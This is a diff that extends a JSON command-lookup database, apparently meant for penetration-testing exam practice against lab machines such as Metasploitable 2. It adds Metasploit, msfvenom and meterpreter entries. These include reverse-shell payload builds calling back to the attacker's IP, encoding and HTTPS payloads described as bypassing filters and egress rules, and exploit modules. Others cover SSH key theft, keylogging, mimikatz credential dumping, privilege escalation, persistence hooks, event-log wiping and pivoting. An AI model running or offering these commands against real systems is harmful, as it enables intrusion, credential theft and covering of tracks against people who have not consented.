@@ -4400,5 +4400,555 @@
       "look for local vulnerabilities",
       "path to root suggest"
     ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "db_status",
+    "desc": "checks if metasploit is properly connected to the local postgresql database to store scan logs",
+    "keywords": [
+      "check database",
+      "postgresql status",
+      "msf db check",
+      "connection status"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "db_nmap -sV",
+    "desc": "runs an nmap version scan directly inside metasploit and automatically saves results to the active database",
+    "keywords": [
+      "msf nmap",
+      "database scan",
+      "internal nmap",
+      "save scan results"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "hosts",
+    "desc": "views all the saved remote target system ip addresses stored in the current database workspace",
+    "keywords": [
+      "list saved hosts",
+      "view target ips",
+      "database hosts",
+      "network map list"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "services -p 80",
+    "desc": "filters and lists only the specific targets from the database that have port 80 open",
+    "keywords": [
+      "filter ports",
+      "list open services",
+      "search active web ports",
+      "port filter database"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "vulns",
+    "desc": "lists all verified or highly probable vulnerabilities identified across targets during the database logging session",
+    "keywords": [
+      "list vulnerabilities",
+      "check discovered vulns",
+      "exploit match logs",
+      "security tracking"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf > shell.elf",
+    "desc": "generates a standard staged 32-bit linux executable binary that drops a meterpreter shell upon running",
+    "keywords": [
+      "build linux payload",
+      "create elf shell",
+      "staged linux shell",
+      "msfvenom elf"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf > shell64.elf",
+    "desc": "creates an un-staged inline 64-bit linux payload that returns a direct classic bash shell",
+    "keywords": [
+      "linux 64bit payload",
+      "inline reverse shell",
+      "non staged shell",
+      "standard linux binary"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw > shell.php",
+    "desc": "generates a raw php script embedded with meterpreter configurations designed for web application file uploads",
+    "keywords": [
+      "php shell upload",
+      "website reverse shell",
+      "web exploit script",
+      "reverse php payload"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe",
+    "desc": "creates a traditional 32-bit windows executable payload designed to connect back to your multi-handler listener",
+    "keywords": [
+      "create windows exe",
+      "windows reverse shell",
+      "meterpreter executable payload",
+      "desktop payload build"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw > shell.py",
+    "desc": "outputs a pure python structural code string containing compressed connection macros",
+    "keywords": [
+      "python reverse shell",
+      "script format payload",
+      "platform independent shell",
+      "py exploit"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw > shell.jsp",
+    "desc": "builds a java server page configuration layout useful for cracking web apps using tomcat or jboss managers",
+    "keywords": [
+      "jsp reverse shell",
+      "tomcat shell upload",
+      "java web payload",
+      "jsp target attack"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f elf > encoded.elf",
+    "desc": "encodes the exploit engine structural bytes 3 times using shikata_ga_nai algorithm to bypass basic firewalls",
+    "keywords": [
+      "encode payload",
+      "bypass security filter",
+      "signature evasion",
+      "obfuscate exploit binary"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom --list payloads",
+    "desc": "dumps every single pre-configured raw system connection payload type natively available inside msfvenom",
+    "keywords": [
+      "view all payloads",
+      "msfvenom reference list",
+      "lookup shell configurations",
+      "payload directory"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p cmd/unix/reverse_bash LHOST=<your_ip> LPORT=4444 -f raw",
+    "desc": "outputs a clean raw bash one-liner command string without compiling it into a file format",
+    "keywords": [
+      "bash one liner shell",
+      "interactive text payload",
+      "quick terminal connection",
+      "raw command payload"
+    ]
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=443 -f exe > secure.exe",
+    "desc": "generates a windows executable that hides its traffic inside secure web encryption over port 443 to bypass egress rules",
+    "keywords": [
+      "reverse https payload",
+      "bypass firewall shell",
+      "encrypted terminal traffic",
+      "port 443 shell"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp",
+    "desc": "launches the generic multi-protocol catch-listener and maps it to a specific staged linux connection signature",
+    "keywords": [
+      "start connection handler",
+      "catch reverse shell",
+      "setup msf listener",
+      "multi handler activation"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set ExitOnSession false",
+    "desc": "configures the active multi-handler to stay awake and alive even after successfully capturing a shell session",
+    "keywords": [
+      "persistent listener",
+      "handle multiple shells",
+      "continuous handler execution",
+      "multi session catch"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "exploit -j",
+    "desc": "forces the current attack engine or incoming connection handler to load quietly in the background as a workspace job",
+    "keywords": [
+      "run exploit background",
+      "background execution job",
+      "non blocking listener",
+      "trigger attack job"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "jobs -v",
+    "desc": "displays a highly descriptive breakdown of all ongoing network background listening threads and ports",
+    "keywords": [
+      "inspect background tasks",
+      "detailed jobs view",
+      "check active listeners",
+      "verbose job check"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "set AutoRunScript post/windows/manage/migrate",
+    "desc": "instructs the system to automatically move and hide its memory execution space inside a safe system core process upon shell delivery",
+    "keywords": [
+      "automatic process migration",
+      "hide shell execution",
+      "post connection automation",
+      "stealth persistence"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/webapp/webmin_backdoor",
+    "desc": "targets a known password change structural vulnerability inside old webmin configurations operating on Port 10000",
+    "keywords": [
+      "webmin exploit rce",
+      "port 10000 attack",
+      "web administration control bypass",
+      "unix target panel"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/ftp/proftpd_133c_backdoor",
+    "desc": "fires an exploit against a notorious unauthorized hidden modification embedded inside old proftpd 1.3.3c deployments",
+    "keywords": [
+      "proftpd backdoor exploit",
+      "alternate ftp shell",
+      "proftpd 1.3.3c crash",
+      "manual control port 21"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/multi/http/sugarcrm_serialize",
+    "desc": "takes advantage of unsafe serialization processing flaws within ancient SugarCRM software portals on Metasploitable 2",
+    "keywords": [
+      "sugarcrm exploit rce",
+      "php deserialization flaw",
+      "web application vulnerability",
+      "portal injection"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/unix/webapp/tikiwiki_graph_formula_exec",
+    "desc": "exploits an input parsing calculation mistake inside older tikiwiki versions to execute system level code commands",
+    "keywords": [
+      "tikiwiki rce exploit",
+      "wiki application attack",
+      "web portal code injection",
+      "server breach"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use exploit/linux/postgres/postgres_payload",
+    "desc": "abuses authorized database functions to drop and execute automated malicious payloads on target systems via SQL access",
+    "keywords": [
+      "postgres database exploit",
+      "backend structural takeover",
+      "drop binary via sql",
+      "postgresql terminal shell"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/nfs/nfsmount",
+    "desc": "checks and maps out network file system exports that allow open external unauthorized directory mounting links",
+    "keywords": [
+      "nfs export scanner",
+      "mount filesystem check",
+      "network share enumeration",
+      "port 2049 audit"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/misc/ingresslock_backdoor",
+    "desc": "sweeps the machine to verify if the ancient dangerous ingresslock administrative listening shell is wide open on Port 1524",
+    "keywords": [
+      "ingresslock detector",
+      "check port 1524 shell",
+      "raw administrative listener",
+      "backdoor scanner"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/smb/smb_enumshares",
+    "desc": "queries the network file sharing interface to extract full structures of hidden and open shared resources",
+    "keywords": [
+      "smb share enumeration",
+      "map network directories",
+      "read write share check",
+      "samba configuration map"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/phpmyadmin_login",
+    "desc": "tests web administration console interfaces for unpatched default administrative credentials",
+    "keywords": [
+      "phpmyadmin brute force",
+      "default database web credentials",
+      "mysql web backend attack",
+      "check panel access"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/http/dir_scanner",
+    "desc": "crawls the standard web application structure using default file directories to locate hidden or orphaned system links",
+    "keywords": [
+      "basic directory finder",
+      "path crawler msf",
+      "website folder guessing",
+      "identify index paths"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/snmp/snmp_enum",
+    "desc": "dumps complete running server processes, native system account structures, and device statistics via public SNMP configurations",
+    "keywords": [
+      "snmp user enumeration",
+      "dump active system processes",
+      "network asset data harvest",
+      "device metrics leak"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "use auxiliary/scanner/vnc/vnc_none_auth",
+    "desc": "systematically verifies if the active VNC graphical session environment has completely disabled password protection controls",
+    "keywords": [
+      "bypass vnc password",
+      "null authentication tester",
+      "remote desktop access security bypass",
+      "port 5900 open access"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "run autoroute -s 10.10.10.0/24",
+    "desc": "configures a dynamic framework internal routing path to send attack traffic directly into hidden networks behind a victim",
+    "keywords": [
+      "network pivoting setup",
+      "target internal routing",
+      "pivot host configuration",
+      "routing via session"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "portfwd add -l 8080 -p 80 -r <internal_target_ip>",
+    "desc": "bridges your local attacking port 8080 directly to an isolated internal target port 80 via the compromised channel",
+    "keywords": [
+      "remote port forwarding",
+      "internal web bridge",
+      "tunnel internal services",
+      "pivot port map"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "run post/linux/gather/enum_configs",
+    "desc": "gathers and extracts every critical application configuration log and structure from a compromised linux platform",
+    "keywords": [
+      "parse linux configurations",
+      "extract system settings",
+      "retrieve text configs",
+      "automatic data gathering"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "run post/linux/gather/enum_network",
+    "desc": "pulls active network interface status reports, active routing tables, and local connection maps from target systems",
+    "keywords": [
+      "gather internal network data",
+      "target routing metrics",
+      "read local connection tables",
+      "interfaces check"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "run post/linux/gather/enum_system",
+    "desc": "records complete target system kernel details, running package versions, and chronologically planned tasks",
+    "keywords": [
+      "enumerate system logs",
+      "operating system patch check",
+      "cron schedule scanner",
+      "architecture extraction"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "run post/multi/gather/ssh_creds",
+    "desc": "scans internal user directories to find and steal unencrypted active id_rsa private authentication keys",
+    "keywords": [
+      "steal ssh keys",
+      "extract private credentials",
+      "private identity harvesting",
+      "post exploitation creds"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "getsystem",
+    "desc": "runs a collection of automated local permission elevation attack macros to lift your access up to elite administrator space",
+    "keywords": [
+      "elevate permissions windows",
+      "system escalation macro",
+      "bypass access control",
+      "administrative power"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "keyscan_start",
+    "desc": "injects monitoring code into human interface interaction loops to watch and record real-time hardware keyboard events",
+    "keywords": [
+      "start terminal keylogger",
+      "intercept keystrokes",
+      "capture typed passwords",
+      "live monitor logs"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "keyscan_dump",
+    "desc": "flushes out and displays all captured text entries and keyboard histories captured by the active keylogger module",
+    "keywords": [
+      "view keylogger output",
+      "read intercepted passwords",
+      "print captured keystrokes",
+      "dump text logs"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "clearev",
+    "desc": "sanitizes application, security, and baseline operation log records on target platforms to wipe tracking data",
+    "keywords": [
+      "wipe application logs",
+      "clear event tracks",
+      "eliminate security logs",
+      "forensic evasion tool"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "persistence -U -i 10 -p 4444 -r <your_ip>",
+    "desc": "establishes an automated persistent boot hook that retries launching system connections every 10 seconds upon startup",
+    "keywords": [
+      "establish persistent shell",
+      "backdoor boot survival",
+      "automated connection persistence",
+      "keep shell access"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "arp_scanner -r 192.168.1.0/24",
+    "desc": "broadcasts quick hardware address queries across adjacent local target spaces directly inside the shell layer",
+    "keywords": [
+      "native arp scanner",
+      "discover hidden subnet devices",
+      "localized hardware sweeps",
+      "quiet network discovery"
+    ]
+  },
+  {
+    "tool": "meterpreter",
+    "command": "load kiwi",
+    "desc": "dynamically brings down complex internal operational toolsets into the target runtime space to read text access credentials",
+    "keywords": [
+      "mimic mimikatz deployment",
+      "dump plain text passwords",
+      "clear text memory extraction",
+      "credential parsing"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "resource /path/to/script.rc",
+    "desc": "processes a predefined series of terminal commands sequentially out of a basic flat text configuration script",
+    "keywords": [
+      "automate metasploit commands",
+      "run resource file",
+      "automated macro execution",
+      "sequence script runner"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "makerc /path/to/save.rc",
+    "desc": "exports your active terminal command execution history directly into an automated runnable script layout",
+    "keywords": [
+      "save command history",
+      "create script resource",
+      "export shell macro",
+      "automation recording"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "workspace -a exam_target",
+    "desc": "separates your execution targets into an isolated separate database profile zone to preserve structural notes",
+    "keywords": [
+      "create separate workspace",
+      "organize target groups",
+      "isolated exam space",
+      "database management split"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "workspace default",
+    "desc": "drops your active terminal execution scope back into the primary global database profile workspace",
+    "keywords": [
+      "return home workspace",
+      "switch default profile",
+      "baseline target view",
+      "database reset navigation"
+    ]
+  },
+  {
+    "tool": "msfconsole",
+    "command": "spool /path/to/log.txt",
+    "desc": "mirrors and writes all live terminal outputs, vulnerability notifications, and exploit text records straight into an external tracking file",
+    "keywords": [
+      "start terminal recording",
+      "spool console logs",
+      "output session mirroring",
+      "write continuous trace logs"
+    ]
   }
 ]
